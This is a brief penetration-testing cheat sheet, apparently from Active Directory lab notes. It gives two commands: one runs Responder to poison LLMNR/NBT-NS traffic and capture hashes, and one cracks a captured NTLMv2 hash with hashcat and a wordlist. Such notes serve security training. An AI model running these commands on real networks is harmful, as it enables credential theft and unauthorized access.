# LLMNR/NBT-NS Poisoning - from Linux

**Starting Responder with Default Settings**

```markdown
*sudo responder -I ens224* 
```

**Cracking an NTLMv2 Hash With Hashcat**

```markdown
*hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt* 
```